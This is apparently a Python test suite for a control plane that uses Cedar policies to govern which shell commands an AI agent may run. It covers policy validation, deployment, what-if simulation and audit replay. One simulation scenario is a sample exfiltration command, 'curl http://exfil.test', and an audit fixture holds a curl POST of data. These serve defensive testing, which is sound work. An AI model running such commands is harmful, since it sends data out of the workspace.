"""
Test Suite for BAP-1001 & BAP-1002 (Epic 10):
Dynamic Cedar Policy Authoring UI & Visual Sandbox Simulator
============================================================
Verifies:
1. BAP-1001: Cedar Policy Validation API with line diagnostics.
2. BAP-1001: Active Cedar Policy Bundle Query & Governed Deployment.
3. BAP-1002: "What-If" Policy Simulation Sandbox with diff impact analysis.
4. BAP-1002: Historical audit execution replay diffing.
5. React Dashboard Hosting & Asset Delivery.
"""

import json
import os
import shutil
import subprocess
import tempfile
import time
import unittest
import urllib.error
import urllib.request

WORKSPACE_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CONTROL_PLANE_BIN = os.path.join(WORKSPACE_ROOT, "dist", "windows-amd64", "bapcontrolplane.exe")

TEST_SECRET = "cedar-studio-test-signing-key-32-chars-long!"
TEST_ADMIN_TOKEN = "cedar-studio-admin-secret-token-12345"
CP_PORT = 19185
CP_URL = f"http://127.0.0.1:{CP_PORT}"


def http_req(url, method="GET", data=None, headers=None):
    hdrs = headers or {}
    body_bytes = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body_bytes = json.dumps(data).encode("utf-8")
            if "Content-Type" not in hdrs:
                hdrs["Content-Type"] = "application/json"
        elif isinstance(data, str):
            body_bytes = data.encode("utf-8")
        else:
            body_bytes = data

    req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            raw = resp.read()
            parsed = {}
            try:
                parsed = json.loads(raw.decode("utf-8"))
            except Exception:
                pass
            return resp.status, parsed, raw
    except urllib.error.HTTPError as e:
        raw = e.read()
        parsed = {}
        try:
            parsed = json.loads(raw.decode("utf-8"))
        except Exception:
            pass
        return e.code, parsed, raw


class TestCedarPolicyStudio(unittest.TestCase):
    proc = None
    tmpdir = None

    @classmethod
    def setUpClass(cls):
        cls.tmpdir = tempfile.mkdtemp(prefix="bap_cedar_test_")
        cls.policy_file = os.path.join(cls.tmpdir, "policy.cedar")
        cls.schema_file = os.path.join(cls.tmpdir, "schema.json")

        initial_policy = """
// Initial Baseline Policy
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
)
when {
    context.executable == "git" || context.executable == "echo"
};
"""
        with open(cls.policy_file, "w", encoding="utf-8") as f:
            f.write(initial_policy)
        with open(cls.schema_file, "w", encoding="utf-8") as f:
            f.write("{}")

        cmd = [
            CONTROL_PLANE_BIN,
            "-port", str(CP_PORT),
            "-secret", TEST_SECRET,
            "-admin-token", TEST_ADMIN_TOKEN,
            "-allow-remote-admin",
            "-policy", cls.policy_file,
            "-schema", cls.schema_file,
            "-demo-mode",
        ]

        cls.proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=cls.tmpdir,
        )

        # Wait for control plane startup
        started = False
        for _ in range(30):
            time.sleep(0.15)
            try:
                st, data, _ = http_req(f"{CP_URL}/health")
                if st == 200:
                    started = True
                    break
            except Exception:
                pass

        if not started:
            if cls.proc.poll() is not None:
                out, err = cls.proc.communicate()
                raise RuntimeError(f"Control plane died on start: {out.decode()} / {err.decode()}")
            raise RuntimeError("Control plane failed to start within timeout")

    @classmethod
    def tearDownClass(cls):
        if cls.proc:
            try:
                cls.proc.terminate()
                cls.proc.wait(timeout=3)
            except Exception:
                cls.proc.kill()
        if cls.tmpdir and os.path.exists(cls.tmpdir):
            shutil.rmtree(cls.tmpdir, ignore_errors=True)

    def test_01_get_current_policy_bundle(self):
        """BAP-1001: Query active Cedar policy bundle."""
        st, data, _ = http_req(f"{CP_URL}/api/v1/policies/cedar/current")
        self.assertEqual(st, 200)
        self.assertIn("version", data)
        self.assertIn("digest", data)
        self.assertIn("policy_cedar", data)
        self.assertTrue(data["version"] >= 1)
        self.assertIn("context.executable == \"git\"", data["policy_cedar"])

    def test_02_validate_cedar_syntax_valid(self):
        """BAP-1001: Validate syntactically correct Cedar policy."""
        valid_cedar = """
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
)
when {
    context.executable == "pytest"
};
"""
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/policies/cedar/validate",
            method="POST",
            data={"policy_cedar": valid_cedar},
        )
        self.assertEqual(st, 200)
        self.assertTrue(data.get("valid"))
        self.assertEqual(data.get("policy_count"), 1)
        self.assertEqual(len(data.get("errors", [])), 0)
        self.assertTrue(len(data.get("digest", "")) > 10)

    def test_03_validate_cedar_syntax_invalid_with_diagnostics(self):
        """BAP-1001: Validate invalid Cedar syntax and verify line error diagnostics."""
        broken_cedar = """
permit (
    principal == Agent::"Local"
    // Missing comma and action
    resource == Command::"CLI"
)
"""
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/policies/cedar/validate",
            method="POST",
            data={"policy_cedar": broken_cedar},
        )
        self.assertEqual(st, 200)
        self.assertFalse(data.get("valid"))
        errors = data.get("errors", [])
        self.assertTrue(len(errors) > 0)
        self.assertTrue(errors[0].get("line") >= 1)
        self.assertTrue(len(errors[0].get("message", "")) > 0)

    def test_04_deploy_cedar_policy_rejects_invalid(self):
        """BAP-1001: Deploy rejects malformed policy with 400 Bad Request."""
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/policies/cedar/deploy",
            method="POST",
            data={"policy_cedar": "not a cedar rule", "reason": "bad rule"},
            headers={"X-BAP-Admin-Token": TEST_ADMIN_TOKEN},
        )
        self.assertEqual(st, 400)
        self.assertIn("errors", data)

    def test_05_deploy_cedar_policy_success_and_version_bump(self):
        """BAP-1001: Governed deployment bumps version and updates digest."""
        new_cedar = """
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
)
when {
    context.executable == "git" || context.executable == "pytest" || context.executable == "npm"
};
"""
        st, data, _ = http_req(
            f"{CP_URL}/api/v1/policies/cedar/deploy",
            method="POST",
            data={
                "policy_cedar": new_cedar,
                "reason": "BAP-1001: Add pytest and npm to permitted development toolchains",
            },
            headers={"X-BAP-Admin-Token": TEST_ADMIN_TOKEN},
        )
        self.assertEqual(st, 200)
        self.assertIn("version", data)
        new_version = data["version"]
        self.assertTrue(new_version >= 2)
        new_digest = data["digest"]

        # Confirm via get current
        st2, cur, _ = http_req(f"{CP_URL}/api/v1/policies/cedar/current")
        self.assertEqual(st2, 200)
        self.assertEqual(cur["version"], new_version)
        self.assertEqual(cur["digest"], new_digest)
        self.assertIn("npm", cur["policy_cedar"])

    def test_06_what_if_policy_simulation_sandbox(self):
        """BAP-1002: Simulation sandbox calculates impact diffs between current and draft policies."""
        # Current policy permits: git, pytest, npm.
        # Draft policy permits: git only (denies pytest and npm).
        draft_policy = """
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
)
when {
    context.executable == "git"
};
"""
        scenarios = [
            {"id": "sc1", "executable": "git", "full_command": "git status", "escapes_workspace": False},
            {"id": "sc2", "executable": "pytest", "full_command": "pytest tests/ -v", "escapes_workspace": False},
            {"id": "sc3", "executable": "npm", "full_command": "npm test", "escapes_workspace": False},
            {"id": "sc4", "executable": "curl", "full_command": "curl http://exfil.test", "escapes_workspace": True},
        ]

        st, report, _ = http_req(
            f"{CP_URL}/api/v1/policies/cedar/simulate",
            method="POST",
            data={
                "draft_policy": draft_policy,
                "scenarios": scenarios,
                "include_historical_audit": False,
            },
        )
        self.assertEqual(st, 200)
        self.assertEqual(report.get("total_evaluated"), 4)
        self.assertEqual(report.get("current_allowed"), 3)  # git, pytest, npm
        self.assertEqual(report.get("current_denied"), 1)   # curl
        self.assertEqual(report.get("draft_allowed"), 1)    # git
        self.assertEqual(report.get("draft_denied"), 3)     # pytest, npm, curl

        # Impact diffs: pytest and npm flipped from ALLOWED -> DENIED
        self.assertEqual(report.get("impact_diff_count"), 2)
        self.assertEqual(report.get("allowed_to_denied"), 2)
        self.assertEqual(report.get("denied_to_allowed"), 0)

        # Check diff items
        diff_items = {item["scenario_id"]: item for item in report.get("diff_items", [])}
        self.assertEqual(diff_items["sc1"]["diff_type"], "UNCHANGED")
        self.assertEqual(diff_items["sc2"]["diff_type"], "ALLOWED_TO_DENIED")
        self.assertEqual(diff_items["sc3"]["diff_type"], "ALLOWED_TO_DENIED")
        self.assertEqual(diff_items["sc4"]["diff_type"], "UNCHANGED")

    def test_07_what_if_historical_audit_replay(self):
        """BAP-1002: Simulation sandbox incorporates central audit logs into diff report."""
        # 1. Ingest an audit event
        audit_event = [{
            "event_id": f"ev-{int(time.time() * 1000)}",
            "timestamp": "2026-10-04T12:00:00Z",
            "source": "bapedge",
            "executable": "curl",
            "full_command": "curl -X POST https://internal-api/data",
            "decision": "deny",
            "reason": "Unauthorized executable",
            "exit_code": 1,
            "previous_hash": "genesis-bapltd-control-plane",
            "event_hash": "",
        }]
        st, _, _ = http_req(f"{CP_URL}/api/v1/audit/ingest", method="POST", data=audit_event)
        self.assertEqual(st, 200)

        # 2. Draft policy permits curl
        draft_policy = """
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
)
when {
    context.executable == "git" || context.executable == "curl"
};
"""
        st, report, _ = http_req(
            f"{CP_URL}/api/v1/policies/cedar/simulate",
            method="POST",
            data={
                "draft_policy": draft_policy,
                "include_historical_audit": True,
                "max_historical": 10,
            },
        )
        self.assertEqual(st, 200)
        self.assertTrue(report.get("total_evaluated") >= 1)
        # The ingested curl event should be tested and flipped from DENIED -> ALLOWED
        self.assertTrue(report.get("denied_to_allowed") >= 1)

    def test_08_dashboard_hosts_policy_studio(self):
        """BAP-1001: Control plane serves consolidated dashboard hosting Cedar Policy Studio."""
        st, _, raw = http_req(f"{CP_URL}/dashboard/")
        self.assertEqual(st, 200)
        html = raw.decode("utf-8")
        self.assertIn("Cedar policy", html)


if __name__ == "__main__":
    unittest.main()
